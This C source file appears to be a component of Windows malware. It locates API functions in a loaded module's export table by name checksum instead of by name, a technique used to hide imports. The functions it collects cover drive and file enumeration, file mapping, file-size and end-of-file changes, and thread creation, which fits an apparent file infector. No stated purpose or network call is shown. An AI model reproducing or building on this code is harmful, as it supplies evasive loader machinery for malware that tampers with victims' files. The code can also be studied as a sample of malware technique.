#include "checksum.h"
#include "checksum_list.h"
#include "function_list.h"
#include <stdio.h>

static void memzero(void *start, uint32_t size);

int fill_function_list(IMAGE_EXPORT_DIRECTORY *ed, void *base,
                       function_list_t *function_list) {
    uint32_t *name_ptr = (uint32_t *)((uint8_t *)base + ed->AddressOfNames);
    uint32_t *addr_ptr = (uint32_t *)((uint8_t *)base + ed->AddressOfFunctions);
    uint16_t *name_ordinals_ptr =
        (uint16_t *)((uint8_t *)base + ed->AddressOfNameOrdinals);
    int function_counter = 0;

    // name_ordinals_ptr += ed->Base; // TODO: check if really needed +ed->Base

    memzero((void *)function_list, sizeof(function_list_t));

    for (uint32_t i = 0; i < ed->NumberOfNames; i++) {
        void *function_addr =
            (void *)((void **)((uint8_t*)base + *(addr_ptr + *name_ordinals_ptr)));

        switch (checksum((const char *)base + *name_ptr)) {
        case CS_EXITPROCESS:
            function_list->exit_process = (fpExitProcess)function_addr;
            break;
        case CS_GETTICKCOUNT:
            function_list->get_tick_count = (fpGetTickCount)function_addr;
            break;
        case CS_GETPROCESSHEAP:
            function_list->get_process_heap = (fpGetProcessHeap)function_addr;
            break;
        case CS_HEAPALLOC:
            function_list->heap_alloc = (fpHeapAlloc)function_addr;
            break;
        case CS_HEAPFREE:
            function_list->heap_free = (fpHeapFree)function_addr;
            break;
        case CS_FINDFIRSTFILEA:
            function_list->find_first_file_a = (fpFindFirstFileA)function_addr;
            break;
        case CS_FINDNEXTFILEA:
            function_list->find_next_file_a = (fpFindNextFileA)function_addr;
            break;
        case CS_FINDCLOSE:
            function_list->find_close = (fpFindClose)function_addr;
            break;
        case CS_CREATEFILEA:
            function_list->create_file_a = (fpCreateFileA)function_addr;
            break;
        case CS_GETFILESIZE:
            function_list->get_file_size = (fpGetFileSize)function_addr;
            break;
        case CS_CREATEFILEMAPPINGA:
            function_list->create_file_mapping_a =
                (fpCreateFileMappingA)function_addr;
            break;
        case CS_MAPVIEWOFFILE:
            function_list->map_view_of_file = (fpMapViewOfFile)function_addr;
            break;
        case CS_FLUSHVIEWOFFILE:
            function_list->flushViewOfFile = (fpFlushViewOfFile)function_addr;
            break;
        case CS_UNMAPVIEWOFFILE:
            function_list->unmap_view_of_file =
                (fpUnmapViewOfFile)function_addr;
            break;
        case CS_SETFILEPOINTER:
            function_list->set_file_pointer = (fpSetFilePointer)function_addr;
            break;
        case CS_SETENDOFFILE:
            function_list->set_end_of_file = (fpSetEndOfFile)function_addr;
            break;
        case CS_CLOSEHANDLE:
            function_list->close_handle = (fpCloseHandle)function_addr;
            break;
        case CS_CREATETHREAD:
            function_list->create_thread = (fpCreateThread)function_addr;
            break;
        case CS_GETLOGICALDRIVES:
            function_list->get_logical_drives =
                (fpGetLogicalDrives)function_addr;
            break;
        case CS_SLEEP:
            function_list->sleep = (fpSleep)function_addr;
            break;
        default:
            function_counter--;
            break;
        }
        function_counter++;
        name_ptr++;
        name_ordinals_ptr++;
    }
    return function_counter;
}

void *get_function_by_checksum(IMAGE_EXPORT_DIRECTORY *ed, void *base,
                               uint32_t cs) {
    uint32_t *name_ptr = (uint32_t *)((uint8_t *)base + ed->AddressOfNames);
    uint32_t *addr_ptr = (uint32_t *)((uint8_t *)base + ed->AddressOfFunctions);
    uint16_t *name_ordinals_ptr =
        (uint16_t *)((uint8_t *)base + ed->AddressOfNameOrdinals);

    for (uint32_t i = 0; i < ed->NumberOfNames; i++) {
        if (checksum((const char *)base + *name_ptr) == cs) {
            return (void *)((uint8_t *)base + *(addr_ptr + *name_ordinals_ptr));
        }
        name_ptr++;
        name_ordinals_ptr++;
    }
    return NULL;
}

static void memzero(void *start, uint32_t size) {

    for (uint8_t *ptr = start; ptr < (uint8_t *)start + size; ptr++) {
        *ptr = 0;
    }
}
